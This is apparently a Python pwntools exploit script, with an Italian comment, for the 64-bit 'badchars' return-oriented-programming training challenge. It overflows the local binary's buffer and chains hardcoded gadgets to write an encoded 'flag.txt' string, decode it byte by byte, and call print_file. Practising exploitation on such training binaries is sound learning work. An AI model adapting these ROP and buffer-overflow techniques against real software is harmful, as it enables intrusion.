from pwn import *

elf = ELF("./badchars")
p = process("./badchars")

'''
   Come per la versione 32 bit, andremo a scrivere la stringa "flag.txt" shiftata per poi ripristinarla tramite il gatget add_r15_r14b.
'''


mov_r13_r12 = p64(0x0000000000400634)
pop_r12_r13_r14_r15 = p64(0x000000000040069c)
writable_area = 0x0000000000601038
add_r15_r14b = p64(0x000000000040062c) 
pop_r14_r15 = p64(0x00000000004006a0)
pop_rdi = p64(0x00000000004006a3)
print_file = p64(0x0000000000400620)


payload = b''
payload += pop_r12_r13_r14_r15 + b'dj_e,rvr' + p64(writable_area) + p64(0) + p64(0) + mov_r13_r12


for i in range(8):
	payload += pop_r14_r15 + p64(2) + p64(writable_area + i) + add_r15_r14b
payload += pop_rdi + p64(writable_area) + print_file


p.recvuntil('> ')
p.send(cyclic(40) + payload)
p.interactive()
